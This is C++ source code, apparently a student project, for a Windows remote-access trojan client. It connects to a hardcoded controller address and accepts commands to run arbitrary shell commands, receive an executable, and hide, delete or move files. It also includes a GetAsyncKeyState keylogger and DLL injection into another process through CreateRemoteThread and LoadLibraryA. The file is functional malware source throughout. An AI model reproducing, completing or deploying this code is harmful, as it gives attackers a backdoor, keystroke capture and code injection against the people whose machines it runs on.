#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <string>
#include <fstream>
#include "SocketManager.h"
#include "WindowsSocket.h"
#include "string.h"
#include "Aclapi.h""
#include <thread>
#include <tchar.h>

using namespace std;

#define DEFAULT_BUFLEN 1050
#define DEFAULT_PORT "5007"
#define DEFAULT_HOST "10.0.0.1"

std::ofstream openFile(char *file_path)
{
	std::ofstream f2(file_path, std::fstream::binary);
	return f2;
}

void create_file(SocketManager socketManager, SOCKET socket, char* recBuf, int iResult)
{
	char * filePath = "C:\\Users\\admin\\Desktop\\CyberProject\\Client\\client_update_file.exe";
	std::ofstream clientFile = openFile(filePath);
	int iResult2;
	char recvbuf[DEFAULT_BUFLEN * 4];

	do
	{
		//char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
		memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
		iResult = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
		iResult2 = socketManager.send_data(socket, "ok");
		if ((strcmp(recvbuf, "END_UPDATE") != 0))
		{
			clientFile.write(recvbuf, iResult);
			printf("Bytes received: %d\n", iResult);
		}

	} while (strcmp(recvbuf, "END_UPDATE") != 0);


	if (!strcmp(recvbuf, "END_UPDATE"))
	{
		clientFile.close();
		cout << "closed the file" << endl;
	}
}

std::string exec(const char* cmd)
{
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (!feof(pipe)) {
			if (fgets(buffer, 128, pipe) != NULL)
				result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}

void executeCommand(SocketManager socketManager, SOCKET socket)
{
	int result; 
	char recvbuf[DEFAULT_BUFLEN * 4];
	
	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
	
	std::string w = exec(recvbuf);
	cout << w.c_str() << endl;
	
	result = socketManager.send_data(socket, w.c_str());
}

void dirInfo(SocketManager socketManager, SOCKET socket)
{
	int result;
	char recvbuf[DEFAULT_BUFLEN * 4];
	//get directory
	
	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN *4); // TODO: what to do with result?

	string dir = string(recvbuf);
	string command = "cd \"" + dir + "\" && for /f %x in ('dir /b /a') do icacls %x && attrib %x";
	
	//executes the command
	std::string w = exec(command.c_str());

	//send result
	result = socketManager.send_data(socket, w.c_str());	
}

bool changeIp(SocketManager & socketManager, SOCKET & socket)
{
	int result;
	char recvbuf[DEFAULT_BUFLEN * 4];

	//get ip:port
	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
	char* ip = strtok(recvbuf, ":");
	char* port = strtok(NULL, ":");

	//try to connect to new server
	SocketManager newsocketManager;
	//WindowsSocket windowsSocket;
	SOCKET newSocket = INVALID_SOCKET;

	struct addrinfo *addrInfo = NULL, hints;
	char *sendbuf = "this is a test14";
	char recvbuf2[DEFAULT_BUFLEN];
	//int iResult, iResult2;
	int recvbuflen = DEFAULT_BUFLEN;

	//windowsSocket.startup();
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	result = getaddrinfo(ip, port, &hints, &addrInfo);
	if (result != 0) {
		throw new exception("getaddrinfo failed with error: %d\n", result);
	}

	newsocketManager.setAddrInfo(addrInfo);

	// Attempt to connect to an address until one succeeds
	int i = 0;
	int connectResult = SOCKET_ERROR;
	
	// Create a SOCKET for connecting to server
	newSocket = newsocketManager.create();
	bool connected = false;
	while (i < 3) // handle timeout!
	{

		// Connect to server.
		connectResult = newsocketManager.conn(newSocket);
		if (connectResult == SOCKET_ERROR) {
			newsocketManager.close(newSocket);
			newSocket = INVALID_SOCKET;
			i++;
			continue;
		}
		connected = true;
		break;
	}

	freeaddrinfo(addrInfo);
	if (connected)
	{
		result = socketManager.send_data(socket, "accept");
		socketManager.close(socket);
		socketManager = newsocketManager;
		socket = newSocket;
	}

	//delete[] recvbuf;
	return connected;
}

string changeAttrib(string filePath, string attrib)
{
	string command = "attrib " + attrib + " \"" + filePath + "\"";

	//executes the command
	std::string w = exec(command.c_str());

	return w;
}

void showHiddenFile(SocketManager & socketManager, SOCKET & socket)
{
	int result;
	char recvbuf[DEFAULT_BUFLEN * 4];
	//get directory

	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?

	string filePath = string(recvbuf);
	
	//executes the command
	std::string w = changeAttrib(filePath, "-H");

	if (w.size() == 0)
	{
		w = "success";
	}

	//send result
	result = socketManager.send_data(socket, w.c_str());
}

void hideFile(SocketManager & socketManager, SOCKET & socket)
{
	int result;
	char recvbuf[DEFAULT_BUFLEN * 4];
	//get directory

	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?

	string filePath = string(recvbuf);

	//executes the command
	std::string w = changeAttrib(filePath, "+H");

	if (w.size() == 0)
	{
		w = "success";
	}

	//send result
	result = socketManager.send_data(socket, w.c_str());
}

void deleteFile(SocketManager & socketManager, SOCKET & socket)
{
	int result;
	char recvbuf[DEFAULT_BUFLEN * 4];
	//get directory

	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?
	string filePath = string(recvbuf);

	string command = "del /f \"" + filePath + "\"";

	//executes the command
	std::string w = exec(command.c_str());

	if (w.size() == 0)
	{
		w = "success";
	}

	//send result
	result = socketManager.send_data(socket, w.c_str());
}

void moveFile(SocketManager & socketManager, SOCKET & socket)
{
	int result;
	char recvbuf[DEFAULT_BUFLEN * 4];
	//get directory

	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?
	string filePath = string(recvbuf);
	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?
	string dirToMove = string(recvbuf);

	char sep = '\\';
	string fileName;
	size_t i = filePath.rfind(sep, filePath.length());
	if (i != string::npos) {
		fileName = (filePath.substr(i + 1, filePath.length() - i)); 
	}
	else
	{
		throw new exception("Error reading file path");
	}

	string command = "move \"" + filePath + "\" " + "\"" + dirToMove + "\\" + fileName + "\"";

	//executes the command
	std::string w = exec(command.c_str());
	if (w.size() == 0)
	{
		w = "Something went wrong...";
	}

	//send result
	result = socketManager.send_data(socket, w.c_str());
}

char convertKey(int key)
{
	switch (key)
	{
	case 49: return '!';
	case 50: return '@';
	case 51: return '#';
	case 52: return '$';
	case 53: return '%';
	case 54: return '^';
	case 55: return '&';
	case 56: return '*';
	case 57: return '(';
	case 48: return ')';
	case 45: return '_';
	case 61: return '+';
		//case 56: return '*';
	}
	return '\0';
}

void keyLOG(string input) {
	fstream LogFile;
	LogFile.open("keyLogger.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_CONTROL:
		keyLOG("#CTRL#");
		return true;
	case VK_TAB:
		keyLOG("\t");
		return true;
	case VK_SPACE:
		keyLOG(" ");
		return true;
	case VK_RETURN:
		keyLOG("\n");
		return true;
	case '¾':
		keyLOG(".");
		return true;
	case VK_BACK:
		keyLOG("\b");
		return true;
	case VK_RBUTTON:
		keyLOG("#R_CLICK#");
		return true;
	case VK_SHIFT:
		keyLOG("");
		return true;
	default:
		return false;
	}
}

void stopKeyLogger()
{

}

DWORD WINAPI startKeyLogger()
{
	char KEY = 'x';
	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						if (KEY >= 65 && KEY <= 90) // letters
						{
							if ((GetKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL) & 0x0001)) // capital letters
							{
								LogFile << char(KEY);
							}
							else // lower letters
							{
								LogFile << char(KEY + 32);
							}
						}
						else // not letters
						{
							if (GetKeyState(VK_SHIFT) & 0x8000) // shift is on 
							{
								char newKey = convertKey(KEY);
								if (newKey != '\0')
								{
									LogFile << newKey;
								}
							}
							else // shift is off 
							{
								LogFile << char(KEY);
							}
						}
						LogFile.close();
					}
				}
			}
		}
	}
}

void iatHooking(SocketManager & socketManager, SOCKET & socket)
{
	int result;
	char recvbuf[DEFAULT_BUFLEN * 4];
	//get directory

	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?

	char * dllPath = "IAT Hooking\IATHooking.dll";
	std::ofstream clientFile = openFile(dllPath);
	clientFile.write(recvbuf, result);
	clientFile.close();
	/*
	LPTSTR exePath = _tcsdup(TEXT("..\\Server\\IAT Hooking\\Hooked\\Debug\\Hooked.exe"));


	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	HANDLE hprocess = NULL;
	if (CreateProcess(NULL, exePath, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFO)&info, &processInfo))
	{
		hprocess = processInfo.hProcess;
	}
	if (!hprocess)
	{
		cout << GetLastError();
	}
	LPVOID LoadLibraryAtRemoteProcess =
		(LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

	LPVOID dllPathLocalAddress = (LPVOID)dllPath;
	LPVOID dllPathRemoteAddress = (LPVOID)VirtualAllocEx(hprocess, NULL, strlen(dllPath),
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hprocess, dllPathRemoteAddress, dllPathLocalAddress,
		strlen(dllPath), NULL);

	CreateRemoteThread(hprocess, NULL, NULL, (LPTHREAD_START_ROUTINE)
		LoadLibraryAtRemoteProcess, (LPVOID)dllPathRemoteAddress, NULL, NULL);

	ResumeThread(processInfo.hThread);
	WaitForSingleObject(processInfo.hProcess, INFINITE);
	CloseHandle(processInfo.hProcess);
	CloseHandle(processInfo.hThread);
	*/
}

int main12(int argc, char **argv)
{
	SocketManager socketManager;
	WindowsSocket windowsSocket;
	SOCKET socket = INVALID_SOCKET;

	struct addrinfo *result = NULL, hints;
	char *sendbuf = "this is a test14";
	char recvbuf[DEFAULT_BUFLEN];
	int iResult, iResult2;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	try
	{
		windowsSocket.startup();
		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		// Resolve the server address and port
		iResult = getaddrinfo(DEFAULT_HOST, DEFAULT_PORT, &hints, &result);
		if (iResult != 0) {
			throw new exception("getaddrinfo failed with error: %d\n", iResult);
		}

		socketManager.setAddrInfo(result);

		// Attempt to connect to an address until one succeeds
		bool connectResult = false;
		while (true) // handle timeout!
		{
			// Create a SOCKET for connecting to server
			socket = socketManager.create();

			// Connect to server.
			connectResult = socketManager.conn(socket);
			if (connectResult == SOCKET_ERROR) {
				socketManager.close(socket);
				socket = INVALID_SOCKET;
				continue;
			}
			break;
		}

		freeaddrinfo(result);

		// Send an initial buffer
		iResult = socketManager.send_data(socket, sendbuf);

		printf("Bytes Sent: %ld\n", iResult);

		// Receive until the peer closes the connection
		do {
			try
			{
				char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
				iResult = socketManager.receive(socket, recvbuf, recvbuflen * 4);
				if (iResult > 0)
				{

					//string buf = string(recvbuf);
					//cout << buf.substr(0, iResult);

					if (!strcmp(recvbuf, "UPDATE"))
					{
						create_file(socketManager, socket, recvbuf, iResult);
					}
					else if (!strcmp(recvbuf, "EXECUTE"))
					{
						executeCommand(socketManager, socket);
					}
					else if (!strcmp(recvbuf, "CHANGE_IP"))//2, 5
					{
						bool connected = changeIp(socketManager, socket);
						if (connected)
						{
							iResult2 = socketManager.send_data(socket, "this is a test");

						}
						else
						{
							iResult2 = socketManager.send_data(socket, "reject");
						}
					}
					else if (!strcmp(recvbuf, "FILE_SYSTEM_INFO"))//2, 6
					{
						dirInfo(socketManager, socket);
					}
					else if (!strcmp(recvbuf, "SHOW_HIDDEN_FILE"))//2, 6
					{
						showHiddenFile(socketManager, socket);
					}
					else if (!strcmp(recvbuf, "HIDE_FILE"))//2, 6
					{
						hideFile(socketManager, socket);
					}
					else if (!strcmp(recvbuf, "DELETE_FILE"))//2, 6
					{
						deleteFile(socketManager, socket);
					}
					else if (!strcmp(recvbuf, "MOVE_FILE"))//2, 6
					{
						moveFile(socketManager, socket);
					}
					else if (!strcmp(recvbuf, "START_KEY_LOGGER"))
					{
						//CreateThread(NULL,)
						startKeyLogger();//from differnet thread
					}
					else if (!strcmp(recvbuf, "STOP_KEY_LOGGER"))
					{
						//CreateThread(NULL,)
						stopKeyLogger();//from differnet thread
					}
					else if (!strcmp(recvbuf, "IAT_HOOKING"))
					{
						//CreateThread(NULL,)
						iatHooking(socketManager, socket);
					}				
					else
					{
						printf("Bytes received: %d\n", iResult);
						//iResult2 = socketManager.send_data(socket, "ok");
						string buf = string(recvbuf);
						cout << buf.substr(0, iResult);
					}
				}
			}
			catch (exception ex)
			{
				cout << ex.what();
				continue;
			}

		} while (iResult > 0);

		// cleanup

		socketManager.close(socket);
		windowsSocket.cleanup();
		return 0;
	}
	catch (exception ex)
	{
		cout << ex.what();
		windowsSocket.cleanup();
		return 1;
	}
}


int main()
{
	//LPTSTR exePath = _tcsdup(TEXT("C:\\Users\\admin\\Documents\\PE\\HOOKING1\\notepad.exe"));
	LPTSTR exePath = _tcsdup(TEXT("..\\Server\\IAT Hooking\\Hooked\\Debug\\Hooked.exe"));

	char* dllPath = "C:\\Users\\admin\\Desktop\\CyberProject\\Server\\IAT Hooking\\IATHookingDLL.dll";


	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	HANDLE hprocess = NULL;
	hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 13996);
	/*if (CreateProcess(NULL, exePath, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFO)&info, &processInfo))
	{
		hprocess = processInfo.hProcess;
	}*/
	if (!hprocess)
	{
		cout << GetLastError();

	}
	/*DWORD tId = GetMainThreadId(15848);
	if (tId == FALSE)
		return NULL;
*/
	//HANDLE hthread =  OpenThread(THREAD_ALL_ACCESS, FALSE, tId);

	LPVOID LoadLibraryAtRemoteProcess =
		(LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

	LPVOID dllPathLocalAddress = (LPVOID)dllPath;
	LPVOID dllPathRemoteAddress = (LPVOID)VirtualAllocEx(hprocess, NULL, strlen(dllPath),
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hprocess, dllPathRemoteAddress, dllPathLocalAddress,
		strlen(dllPath), NULL);

	HANDLE hthread = CreateRemoteThread(hprocess, NULL, NULL, (LPTHREAD_START_ROUTINE)
		LoadLibraryAtRemoteProcess, (LPVOID)dllPathRemoteAddress, NULL, NULL);

	//ResumeThread(hthread);
	//WaitForSingleObject(hthread, INFINITE);
	CloseHandle(hprocess);
	CloseHandle(hthread);
	return 0;
}

void task1(std::string msg)
{
	while (true)
	{
		std::cout << "task1 says: " << msg;
	}
}
int main3()
{
	std::thread t1(task1, "Hello");
	t1.join();
	Sleep(3);
	t1.detach();
	std::cout << "tehilla says: " << endl;
	return 0;
}